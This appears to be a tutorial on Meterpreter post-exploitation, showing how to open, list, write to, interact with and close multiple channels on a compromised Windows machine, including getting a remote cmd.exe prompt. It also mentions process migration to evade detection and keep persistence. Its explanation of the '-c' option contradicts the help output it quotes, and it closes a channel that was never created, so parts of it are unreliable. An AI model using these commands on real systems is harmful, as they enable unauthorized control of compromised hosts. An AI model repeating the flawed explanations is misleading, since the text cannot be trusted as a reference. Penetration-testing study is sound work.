## Ways to form more than one communication channels
1. Reverse TCP or HTTP/S connections:
	- The most common way for Meterpreter to estaiblish communication with the target system is through a reverse TCP or HTTP/S connection.
	- Once the initial connection is estaiblished, Meterpreter can create additional connections on different ports or protocols. 
	- For example, Meterpreter can create an additional connection on port 8080 using the HTTP/S protocol while maintaining the original connection on port 4444 using the TCP protocol. 

2. Process Migration:
	- Meterpreter has the ability to migrate its code to another process running on the target system. 
	- This can be useful for evading detection by security software or for maintaining persistence on the system. 
	- Once the migration is complete, Meterpreter can create a new communication channel with the target system.

3. Auxiliary module

## Taking help related to command which is used to start multiple communication channels:
```python
meterpreter > execute -h
Usage: execute -f file [options]
Executes a command on the remote machine.

OPTIONS:

    -a   The arguments to pass to the command.
    -c   Channelized I/O (required for interaction).
    -d   The 'dummy' executable to launch when using -m.
    -f   The executable command to run.
    -h   Help menu.
    -H   Create the process hidden from view.
    -i   Interact with the process after creating it.
    -k   Execute process on the meterpreters current desktop
    -m   Execute from memory.
    -p   Execute process in a pty (if available on target platform)
    -s   Execute process in a given session as the session user
    -t   Execute process with currently impersonated thread token
    -z   Execute process in a subshell
```
- "execute", which can be used to start mulple communication channels. 

## command to start creating communication channels
```python
meterpreter > execute -f notepad.exe -c
Process 4948 created.
Channel 1 created.
```
- The "-f" option is used to specify the name of the file or program to be executed. In this case, "notepad.exe" is specified as the file to be executed.
- The "-c" option is used to specify that the command should be executed in the context of the current process. This means that the command will be executed using the same privileges as the Meterpreter session that is currently active on the target system. 

#### Now, we can run the `execute` command again to start another channel without terminating the current channel:
```python
meterpreter > execute -f cmd.exe -c
Process 296 created.
Channel 2 created.
```

## Listing all the available channels
```python
meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process
```

## Writing message in one of active channel
```python
meterpreter > write 1
Enter data followed by a "." on an empty line:


this is a notepad.exe process which is created using Meterpreter
.
[*] Wrote 65 bytes to channel 1.
```

## Interacting with particular channel
```python
meterpreter > channel -i 2
Interacting with channel 2...

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
- As you can see, our channel 2, was a command-prompt channel.
Note - To background a channel, use `Ctrl + Z`

## Ending a channel
```python
meterpreter > channel -c 3
[*] Closed channel 3.
```

